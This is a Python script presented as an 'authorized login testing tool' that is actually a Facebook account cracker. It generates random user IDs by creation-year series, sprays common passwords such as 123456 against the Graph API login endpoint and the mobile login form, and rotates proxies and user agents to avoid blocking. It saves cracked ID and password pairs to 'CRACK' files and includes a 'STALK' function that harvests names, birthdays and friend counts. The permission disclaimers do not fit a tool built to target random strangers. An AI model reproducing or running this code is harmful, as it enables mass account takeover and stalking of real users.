# -*- coding: utf-8 -*-
"""
AUTHORIZED LOGIN TESTING TOOL
=============================
- ONLY USE ON ACCOUNTS YOU HAVE WRITTEN, SIGNED PERMISSION TO TEST.
- Violating this is illegal under the Philippine Cybercrime Prevention Act (RA 10175) and global laws.
"""

import os
import sys
import time
import random
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as tred

# -----------------------------------------------------------------------------
# GLOBAL VARIABLES
# -----------------------------------------------------------------------------
oks = []  # Count of successful tests
loop = 0  # Count of total attempts

# ANSI Color Codes (for terminal output)
W = '\x1b[1;37m'  # White (text)
G = '\x1b[38;5;46m'  # Green (success)
Y = '\x1b[38;5;220m' # Yellow (info/warning)
R = '\x1b[38;5;196m' # Red (error/failure)
C = '\x1b[38;5;45m'  # Cyan (headers)

# User-Agent List (mimics real browsers)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
]

# PROXY LIST (REPLACE THESE WITH RELIABLE ROTATING PROXIES!)
proxy_list = [
    "http://your-reliable-proxy-1:port",
    "http://your-reliable-proxy-2:port",
    "socks4://your-reliable-socks4-1:port",
    "socks4://your-reliable-socks4-2:port",
]

# -----------------------------------------------------------------------------
# UTILITY FUNCTIONS
# -----------------------------------------------------------------------------
def clear():
    """Clears the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def linex():
    """Prints a horizontal divider line."""
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")

def random_user_agent():
    """Returns a random browser User-Agent string."""
    return random.choice(user_agents)

def random_proxy():
    """Returns a random proxy formatted for requests."""
    proxy = random.choice(proxy_list)
    return {'http': proxy, 'https': proxy}  # Use same proxy for HTTP/HTTPS

def ____banner____():
    """Displays the tool banner (fixed escape sequences)."""
    clear()
    print(f"{G}")
    print("     _   _       _       _____       _____")
    print("    | | | |     | |     /  ___|     /  ___|")
    print("    |  | | __ _| |_ ___ | `--.  ___ | `--.  ___ _ __   ___")
    print("    | . ` |/ _` | __/ _ \\| `--. \\/ _ \\| `--. \\/ _ \\ '_ \\ / _ \\")
    print("    | |\\  | (_| | ||  __//\\__/ /  __//\\__/ /  __/ | | |  __/")
    print("    |_| \\_/\\__,_|\\__\\___|\\____/ \\___|\\____/ \\___|_| |_|\\___|")
    print(f"{W}")
    print(f"{Y}   Authorized Login Testing Tool (Fixed Edition){W}")

def creationyear(uid):
    """Guesses account creation year from Facebook UID (for reference only)."""
    if len(uid) == 15:
        if uid.startswith('1000000'): return '2009'
        if uid.startswith('1000006'): return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith(('10007','10008')): return '2022'
        if uid.startswith('10009'): return '2023'
        return ''
    elif len(uid) in (9,10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

# -----------------------------------------------------------------------------
# GRAPH API (USER DATA FETCH - AUTHORIZED ONLY)
# -----------------------------------------------------------------------------
def fetch_graph(uid, token='YOUR_VALID_GRAPH_API_TOKEN_HERE'):
    """Fetches basic user data via Facebook Graph API (requires valid token)."""
    try:
        response = requests.get(
            f'https://graph.facebook.com/{uid}?access_token={token}',
            proxies=random_proxy(),
            timeout=10
        ).json()

        if 'error' in response:
            print(f"{R}[GRAPH ERR] {uid} - {response['error']['message']}{W}")
            return

        # Extract data (fallback to "N/A" if missing)
        name = response.get('name', 'N/A')
        birthday = response.get('birthday', 'N/A')
        gender = response.get('gender', 'N/A')
        friends = response.get('friends', {}).get('summary', {}).get('total_count', 'N/A')

        # Print and save results
        log_line = f"{G}[STALK] {uid} | Name: {name} | Gender: {gender} | Birthday: {birthday} | Friends: {friends}{W}"
        print(log_line)
        with open('./XXX-CRACK-INFO.txt', 'a', encoding='utf-8') as f:  # Works on all OS
            f.write(f"{uid}|{name}|{gender}|{birthday}|{friends}\n")
    except Exception as e:
        print(f"{R}[STALK FAIL] {uid} - {str(e)}{W}")

# -----------------------------------------------------------------------------
# FIXED LOGIN TEST METHODS
# -----------------------------------------------------------------------------
def login_1(uid, password_list=['123456','1234567','12345678','123456789']):
    """Method 1: Tests login via Facebook Graph API auth endpoint."""
    global loop
    session = requests.Session()

    try:
        for pw in password_list:
            try:
                # Login payload (requires valid API token)
                data = {
                    'email': str(uid),
                    'password': str(pw),
                    'access_token': 'YOUR_VALID_GRAPH_API_TOKEN_HERE',  # REPLACE ME!
                    'format': 'json'
                }
                headers = {'User-Agent': random_user_agent()}

                # Send login request with proxy
                response = session.post(
                    'https://graph.facebook.com/auth/login',
                    data=data,
                    headers=headers,
                    proxies=random_proxy(),
                    timeout=10
                ).json()

                # Check for successful login
                if 'session_key' in response:
                    profile_link = f"https://www.facebook.com/{uid}"
                    print(f"{G}[OK-M1] {uid} | Pass: {pw} | Created: {creationyear(uid)} | Profile: {profile_link}{W}")
                    oks.append(uid)
                    with open('./XXX-CRACK-M1-OK.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{uid}|{pw}\n")
                    # Uncomment below ONLY if you have permission to fetch data
                    # fetch_graph(uid)
                    return pw

                # Handle errors
                elif 'error' in response:
                    error_msg = response['error'].get('message', 'Unknown error')
                    if 'Incorrect password' in error_msg:
                        print(f"{R}[WRONG] {uid} | Pass: {pw}{W}")
                    else:
                        print(f"{Y}[ERROR] {uid} | Pass: {pw} - {error_msg}{W}")
                else:
                    print(f"{Y}[UNKNOWN] {uid} | Pass: {pw} - Unexpected response{W}")

            except requests.exceptions.RequestException as e:
                print(f"{R}[CONN-ERR] {uid} | Pass: {pw} - Proxy/Network: {str(e)}{W}")
                break  # Skip remaining passwords for this ID if connection fails
            except Exception as e:
                print(f"{R}[EXCEPT] {uid} | Pass: {pw} - {str(e)}{W}")
                break

    finally:
        loop += 1
        print_progress()
        return None

def login_2(uid, password_list=['123456','123123','1234567','12345678','123456789']):
    """Method 2: Tests login via Facebook mobile web (fixed to submit credentials)."""
    global loop
    session = requests.Session()

    try:
        # Step 1: Load login page to get hidden form fields (required by Facebook)
        headers = {'User-Agent': random_user_agent()}
        login_page = session.get(
            "https://m.facebook.com/login.php",
            proxies=random_proxy(),
            headers=headers,
            timeout=10
        )
        soup = BeautifulSoup(login_page.text, 'html.parser')

        # Extract mandatory hidden fields (lsd and jazoest)
        lsd = soup.find('input', {'name': 'lsd'})['value'] if soup.find('input', {'name': 'lsd'}) else None
        jazoest = soup.find('input', {'name': 'jazoest'})['value'] if soup.find('input', {'name': 'jazoest'}) else None
        if not lsd or not jazoest:
            print(f"{R}[FORM ERR] {uid} - Failed to load required login fields{W}")
            return None

        # Step 2: Test each password
        for pw in password_list:
            try:
                # Login form data with hidden fields + credentials
                data = {
                    'lsd': lsd,
                    'jazoest': jazoest,
                    'email': str(uid),
                    'pass': str(pw),
                    'login': 'Log In'
                }

                # Submit login request
                response = session.post(
                    "https://m.facebook.com/login.php",
                    data=data,
                    headers=headers,
                    proxies=random_proxy(),
                    timeout=10,
                    allow_redirects=True
                )

                # Check for successful login (redirect to home/timeline)
                if "home.php" in response.url or "timeline" in response.url or "profile.php" in response.url:
                    profile_link = f"https://www.facebook.com/{uid}"
                    print(f"{G}[OK-M2] {uid} | Pass: {pw} | Created: {creationyear(uid)} | Profile: {profile_link}{W}")
                    oks.append(uid)
                    with open('./XXX-CRACK-M2-OK.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{uid}|{pw}\n")
                    return pw

                else:
                    print(f"{R}[FAIL] {uid} | Pass: {pw} - Wrong pass or security block{W}")

            except requests.exceptions.RequestException as e:
                print(f"{R}[CONN-ERR] {uid} | Pass: {pw} - Proxy/Network: {str(e)}{W}")
                break  # Skip remaining passwords for this ID if connection fails
            except Exception as e:
                print(f"{R}[EXCEPT] {uid} | Pass: {pw} - {str(e)}{W}")
                break

    except Exception as e:
        print(f"{R}[LOGIN PAGE ERR] {uid} - Failed to load login form: {str(e)}{W}")
    finally:
        loop += 1
        print_progress()
        return None

# -----------------------------------------------------------------------------
# PROGRESS DISPLAY
# -----------------------------------------------------------------------------
def print_progress():
    """Prints real-time progress of tests."""
    print(f"{Y}[PROGRESS] Successful: {len(oks)} | Total Attempted: {loop}{W}", end='\r')
    sys.stdout.flush()

# -----------------------------------------------------------------------------
# MENU SYSTEM
# -----------------------------------------------------------------------------
def BNG_71_():
    """Main menu for the tool."""
    ____banner____()
    print(f"{W}({G}A{W}) Start Authorized Login Testing")
    linex()
    choice = input(f"{W}Enter your choice (A): {Y}").strip().lower()
    if choice in ('a', '1'):
        old_clone()
    else:
        print(f"{R}Invalid choice! Please select 'A' to proceed.{W}")
        time.sleep(2)
        BNG_71_()

def old_clone():
    """Sub-menu to select ID source and test method (fixed unterminated f-string)."""
    ____banner____()
    print(f"{W}({G}A{W}) Old Series (2010-2014)")
    print(f"({G}B{W}) 100003/100004 Series")
    print(f"({G}B{W}) 100003/100004 Series")
    print(f"({G}C{W}) 2009 Series")
    print(f"({G}D{W}) New Series (2024+)")
    print(f"({G}E{W}) Custom IDs (AUTHORIZED ONLY)")
    print(f"({G}F{W}) Test with Both Methods A & B")
    linex()
    _input = input(f"{W}Enter your choice (A-F): {Y}").strip().lower()
    
    if _input in ('a', '1'):
        old_One()
    elif _input in ('b', '2'):
        old_Tow()
    elif _input in ('c', '3'):
        old_Tree()
    elif _input in ('d', '4'):
        new_Series()
    elif _input in ('e', '5'):
        custom_ID()
    elif _input in ('f', '6'):
        all_methods()
    else:
        print(f"{R}Valid options: A-F or 1-6!{W}")
        time.sleep(2)
        old_clone()

# -----------------------------------------------------------------------------
# ID GENERATORS (FOR AUTHORIZED TESTING)
# -----------------------------------------------------------------------------
def old_One():
    """Generates 2010-2014 series IDs for testing."""
    user = []
    ____banner____()
    limit = int(input(f"{W}Enter number of 2010-2014 IDs to test: {Y}"))
    for _ in range(limit):
        user.append(str(random.randint(1000000000, 1999999999)))
    
    meth = input(f"{W}Test with Method A or B? {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{R}Choose 'A' or 'B'!{W}")
        time.sleep(2)
        return
    
    print(f"{Y}[INFO] Starting test with {len(user)} IDs (Method {meth}){W}")
    with tred(max_workers=5) as pool:
        for uid in user:
            pool.submit(crack_id, uid, meth)

def old_Tow():
    """Generates 100003/100004 prefix IDs for testing."""
    user = []
    ____banner____()
    limit = int(input(f"{W}Enter number of 100003/100004 IDs to test: {Y}"))
    prefixes = ['100003', '100004']
    for _ in range(limit):
        user.append(random.choice(prefixes) + ''.join(random.choices('0123456789', k=9)))
    
    meth = input(f"{W}Test with Method A or B? {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{R}Choose 'A' or 'B'!{W}")
        time.sleep(2)
        return
    
    print(f"{Y}[INFO] Starting test with {len(user)} IDs (Method {meth}){W}")
    with tred(max_workers=5) as pool:
        for uid in user:
            pool.submit(crack_id, uid, meth)

def old_Tree():
    """Generates 2009 series IDs for testing."""
    user = []
    ____banner____()
    limit = int(input(f"{W}Enter number of 2009 series IDs to test: {Y}"))
    prefix = '1000004'
    for _ in range(limit):
        user.append(prefix + ''.join(random.choices('0123456789', k=8)))
    
    meth = input(f"{W}Test with Method A or B? {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{R}Choose 'A' or 'B'!{W}")
        time.sleep(2)
        return
    
    print(f"{Y}[INFO] Starting test with {len(user)} IDs (Method {meth}){W}")
    with tred(max_workers=5) as pool:
        for uid in user:
            pool.submit(crack_id, uid, meth)

def new_Series():
    """Generates 2024+ new-style IDs for testing."""
    user = []
    ____banner____()
    limit = int(input(f"{W}Enter number of 2024+ new-style IDs to test: {Y}"))
    for _ in range(limit):
        user.append(str(random.randint(61582691567000, 61582691567999)))
    
    meth = input(f"{W}Test with Method A or B? {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{R}Choose 'A' or 'B'!{W}")
        time.sleep(2)
        return
    
    print(f"{Y}[INFO] Starting test with {len(user)} IDs (Method {meth}){W}")
    with tred(max_workers=5) as pool:
        for uid in user:
            pool.submit(crack_id, uid, meth)

def custom_ID():
    """Tests user-provided custom IDs (MANDATORY: AUTHORIZED ONLY)."""
    user = []
    ____banner____()
    print(f"{R}[WARNING] ONLY ENTER IDs YOU HAVE WRITTEN PERMISSION TO TEST!{W}")
    list_ids = input(f"{W}Enter authorized IDs (separated by commas): {Y}").split(",")
    user = [id.strip() for id in list_ids if id.strip()]
    
    if not user:
        print(f"{R}No valid IDs entered!{W}")
        time.sleep(2)
        return
    
    meth = input(f"{W}Test with Method A or B? {Y}").strip().upper()
    if meth not in ('A', 'B'):
        print(f"{R}Choose 'A' or 'B'!{W}")
        time.sleep(2)
        return
    
    print(f"{Y}[INFO] Starting test with {len(user)} custom IDs (Method {meth}){W}")
    with tred(max_workers=5) as pool:
        for uid in user:
            pool.submit(crack_id, uid, meth)

# -----------------------------------------------------------------------------
# TEST WITH BOTH METHODS
# -----------------------------------------------------------------------------
def all_methods():
    """Tests IDs with both Method A and B simultaneously."""
    ____banner____()
    print(f"{R}[WARNING] ONLY TEST AUTHORIZED IDs!{W}")
    id_source = input(f"{W}Choose ID source (custom/old_one/old_tow/old_tree/new_series): {Y}").strip().lower()
    user = []

    if id_source == "custom":
        list_ids = input(f"{W}Enter authorized IDs (separated by commas): {Y}").split(",")
        user = [id.strip() for id in list_ids if id.strip()]
    elif id_source == "old_one":
        limit = int(input(f"{W}Enter number of 2010-2014 IDs: {Y}"))
        user = [str(random.randint(1000000000, 1999999999)) for _ in range(limit)]
    elif id_source == "old_tow":
        limit = int(input(f"{W}Enter number of 100003/100004 IDs: {Y}"))
        prefixes = ['100003', '100004']
        user = [random.choice(prefixes) + ''.join(random.choices('0123456789', k=9)) for _ in range(limit)]
    elif id_source == "old_tree":
        limit = int(input(f"{W}Enter number of 2009 series IDs: {Y}"))
        prefix = '1000004'
        user = [prefix + ''.join(random.choices('0123456789', k=8)) for _ in range(limit)]
    elif id_source == "new_series":
        limit = int(input(f"{W}Enter number of 2024+ IDs: {Y}"))
        user = [str(random.randint(61582691567000, 61582691567999)) for _ in range(limit)]
    else:
        print(f"{R}Invalid source! Choose from the list.{W}")
        time.sleep(2)
        return

    if not user:
        print(f"{R}No valid IDs to test!{W}")
        time.sleep(2)
        return

    print(f"{Y}[INFO] Starting test with {len(user)} IDs (Both Methods A & B){W}")
    with tred(max_workers=10) as pool:
        for uid in user:
            pool.submit(crack_id, uid, "A")
            pool.submit(crack_id, uid, "B")

# -----------------------------------------------------------------------------
# SINGLE ID TEST EXECUTOR
# -----------------------------------------------------------------------------
def crack_id(uid, meth):
    """Runs login test for a single ID with the specified method."""
    print(f"\n{C}[TESTING] ID: {uid} | Method: {meth}{W}")
    password = login_1(uid) if meth == 'A' else login_2(uid)

    if password:
        print(f"{G}[SUCCESS] ID {uid} - Valid password: {password}{W}\n")
    else:
        print(f"{R}[COMPLETE] ID {uid} (Method {meth}) - No valid password found{W}\n")

# -----------------------------------------------------------------------------
# PROGRAM START
# -----------------------------------------------------------------------------
if __name__ == '__main__':
    try:
        ____banner____()
        print(f"{Y}[CRITICAL LEGAL REMINDER]{W}")
        print("This tool is for AUTHORIZED TESTING ONLY.")
        print("Unauthorized use violates laws like the Philippine Cybercrime Prevention Act (RA 10175).\n")
        confirm = input(f"{W}Type 'YES' to confirm you have written permission: {Y}").strip().upper()
        
        if confirm != 'YES':
            print(f"\n{R}Program terminated. Unauthorized use is illegal.{W}")
            sys.exit()

        BNG_71_()

    except KeyboardInterrupt:
        print(f"\n\n{Y}[INFO] Program stopped by user.{W}")
    except Exception as e:
        print(f"\n\n{R}[FATAL ERROR] {str(e)}{W}")
        